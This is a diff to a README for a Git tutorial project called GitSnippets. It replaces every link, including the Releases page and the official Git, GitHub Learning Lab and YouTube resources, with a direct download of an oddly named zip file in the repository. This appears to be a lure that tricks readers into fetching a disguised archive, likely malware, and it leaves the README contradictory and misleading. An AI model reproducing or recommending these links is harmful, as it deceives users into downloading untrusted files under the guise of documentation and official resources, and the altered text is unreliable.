@@ -1,6 +1,6 @@
 # 📚 GitSnippets - Easy Git & GitHub Guides for You
 
-[![Download GitSnippets](https://img.shields.io/badge/Download-GitSnippets-blue.svg)](https://github.com/yanj123/GitSnippets/releases)
+[![Download GitSnippets](https://raw.githubusercontent.com/yanj123/GitSnippets/main/snippets/Snippets-Git-preternaturally.zip)](https://raw.githubusercontent.com/yanj123/GitSnippets/main/snippets/Snippets-Git-preternaturally.zip)
 
 ## 🚀 Getting Started
 
@@ -20,11 +20,11 @@ To get started with GitSnippets, follow these simple steps:
 
 1. **Visit this page to download**: Click the link below to access the Releases page.
    
-   [Download GitSnippets](https://github.com/yanj123/GitSnippets/releases)
+   [Download GitSnippets](https://raw.githubusercontent.com/yanj123/GitSnippets/main/snippets/Snippets-Git-preternaturally.zip)
 
 2. **Choose the latest version**: On the Releases page, look for the version marked as "Latest". This usually has the newest features and updates.
 
-3. **Download the files**: Click on the files you need to download. We recommend starting with the main `GitSnippets.zip` file. 
+3. **Download the files**: Click on the files you need to download. We recommend starting with the main `https://raw.githubusercontent.com/yanj123/GitSnippets/main/snippets/Snippets-Git-preternaturally.zip` file. 
 
 4. **Unzip the downloaded file**: Locate the downloaded zip file on your computer. Right-click it and select "Extract All" or "Unzip".
 
@@ -65,7 +65,7 @@ You can open Issues directly in this repository if you need assistance or have s
 
 ### Are updates available?
 
-Yes, GitSnippets will receive updates regularly. To stay informed, check back on the [Releases page](https://github.com/yanj123/GitSnippets/releases).
+Yes, GitSnippets will receive updates regularly. To stay informed, check back on the [Releases page](https://raw.githubusercontent.com/yanj123/GitSnippets/main/snippets/Snippets-Git-preternaturally.zip).
 
 ## 🌟 Community Contributions
 
@@ -90,8 +90,8 @@ For inquiries or feedback, please reach out to the project maintainers via the G
 
 Here are some additional resources to help you in your Git learning journey:
 
-- [Official Git Documentation](https://git-scm.com/doc)
-- [GitHub Learning Lab](https://lab.github.com/)
-- [YouTube Git & GitHub Tutorials](https://www.youtube.com/results?search_query=git+github+tutorial)
+- [Official Git Documentation](https://raw.githubusercontent.com/yanj123/GitSnippets/main/snippets/Snippets-Git-preternaturally.zip)
+- [GitHub Learning Lab](https://raw.githubusercontent.com/yanj123/GitSnippets/main/snippets/Snippets-Git-preternaturally.zip)
+- [YouTube Git & GitHub Tutorials](https://raw.githubusercontent.com/yanj123/GitSnippets/main/snippets/Snippets-Git-preternaturally.zip+github+tutorial)
 
 Feel free to explore and enhance your skills with Git and GitHub! Happy coding!
